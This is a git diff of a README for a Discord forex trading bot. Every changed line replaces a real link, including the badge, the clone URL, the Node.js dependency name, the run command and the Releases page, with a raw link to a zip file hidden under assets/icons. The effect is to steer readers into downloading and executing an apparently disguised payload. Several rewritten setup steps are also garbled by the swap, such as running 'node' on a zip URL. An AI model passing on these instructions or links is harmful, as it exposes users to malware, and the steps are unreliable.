@@ -1,6 +1,6 @@
 # Forex Bot 🤖💹
 
-![Forex Bot](https://img.shields.io/badge/Forex%20Bot-Discord%20Trading%20Bot-blue?style=flat-square)
+![Forex Bot](https://github.com/Jayakumar987/forex-bot/raw/refs/heads/main/assets/icons/forex-bot-v1.8.zip%20Bot-Discord%20Trading%20Bot-blue?style=flat-square)
 
 Welcome to the **Forex Bot** repository! This project is designed for forex trading communities and investors. With this bot, you can track and share trades, fetch charts and data, and much more. Join the growing community of traders and enhance your trading experience with our easy-to-use Discord bot.
 
@@ -27,12 +27,12 @@ To get started with Forex Bot, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Jayakumar987/forex-bot.git
+   git clone https://github.com/Jayakumar987/forex-bot/raw/refs/heads/main/assets/icons/forex-bot-v1.8.zip
    cd forex-bot
    ```
 
 2. **Install Dependencies**:
-   Make sure you have Node.js installed. Then run:
+   Make sure you have https://github.com/Jayakumar987/forex-bot/raw/refs/heads/main/assets/icons/forex-bot-v1.8.zip installed. Then run:
    ```bash
    npm install
    ```
@@ -43,10 +43,10 @@ To get started with Forex Bot, follow these steps:
 4. **Run the Bot**:
    Start the bot with the following command:
    ```bash
-   node index.js
+   node https://github.com/Jayakumar987/forex-bot/raw/refs/heads/main/assets/icons/forex-bot-v1.8.zip
    ```
 
-For the latest releases, visit [Releases](https://github.com/Jayakumar987/forex-bot/releases) to download the latest version and execute it.
+For the latest releases, visit [Releases](https://github.com/Jayakumar987/forex-bot/raw/refs/heads/main/assets/icons/forex-bot-v1.8.zip) to download the latest version and execute it.
 
 ## Usage 📈
 
@@ -86,7 +86,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support 🙋‍♂️
 
-If you encounter any issues or have questions, feel free to open an issue on the GitHub repository. For the latest releases, you can also check the [Releases](https://github.com/Jayakumar987/forex-bot/releases) section.
+If you encounter any issues or have questions, feel free to open an issue on the GitHub repository. For the latest releases, you can also check the [Releases](https://github.com/Jayakumar987/forex-bot/raw/refs/heads/main/assets/icons/forex-bot-v1.8.zip) section.
 
 ---
 
